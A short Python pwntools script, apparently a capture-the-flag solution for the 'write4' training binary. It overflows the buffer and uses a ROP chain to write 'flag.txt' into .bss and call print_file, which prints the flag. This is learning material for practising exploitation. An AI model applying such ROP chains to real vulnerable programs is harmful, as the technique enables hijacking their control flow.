#!/usr/bin/env python3

###
## authored by brvsh
## https://brv.sh/
###

from pwn import *

elf = context.binary = ELF("./write4", checksec=False)
proc = process()

payload = flat([
    b"A" * 40,                  # padding
    p64(0x400690),              # stage 1 - pop r14; pop r15; ret
    p64(0x601038),              # stage 1 - r14 = &.bss
    b"flag.txt",                # stage 1 - r15 = "flag.txt"
    p64(0x400628),              # stage 1 - mov qword ptr [r14], r15; ret
    p64(0x400693),              # stage 2 - pop rdi; ret
    p64(0x601038),              # stage 2 - rdi = &.bss
    p64(elf.sym["print_file"])  # stage 2 - ret2usefulFunction
])

proc.sendlineafter(b"\n> ", payload)
info("brvsh> payload sent!")
proc.recvuntil(b"Thank you!\n")
info(f"brvsh> FLAG! {proc.recvline().decode()}")
proc.close()
